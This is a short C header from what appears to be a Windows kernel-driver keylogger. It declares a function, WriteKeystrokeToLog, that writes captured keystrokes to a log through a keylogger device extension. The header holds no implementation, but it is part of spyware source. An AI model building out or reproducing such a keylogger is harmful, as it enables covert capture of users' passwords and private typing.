#pragma once

#include<ntddk.h>

#include "keylog.h"

void WriteKeystrokeToLog(PKEYLOG_DEVICE_EXTENSION pDevExt, KEY_DATA *kData);

